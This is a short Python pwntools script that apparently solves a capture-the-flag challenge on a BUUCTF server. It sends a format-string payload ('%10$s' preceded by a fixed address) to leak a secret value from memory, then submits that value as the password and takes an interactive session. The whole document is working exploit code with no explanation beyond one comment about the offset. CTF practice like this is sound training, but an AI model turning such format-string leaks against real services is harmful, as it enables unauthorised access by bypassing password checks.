from pwn import *

#r=process('./pwn')
r= remote("node5.buuoj.cn",27324)
context.arch="i386"# x64
context.terminal=["tmux","splitw","-h"]

#gdb.attach(r,'b main')
#debug 得到偏移量10
payload=p32(0x804C044)+b'%10$s'

r.sendlineafter(b"name:",payload)
s=r.recvline()
print(s[10:14])

r.sendlineafter(b'passwd:',str(int.from_bytes(s[10:14],byteorder='little', signed=False)))
r.interactive()
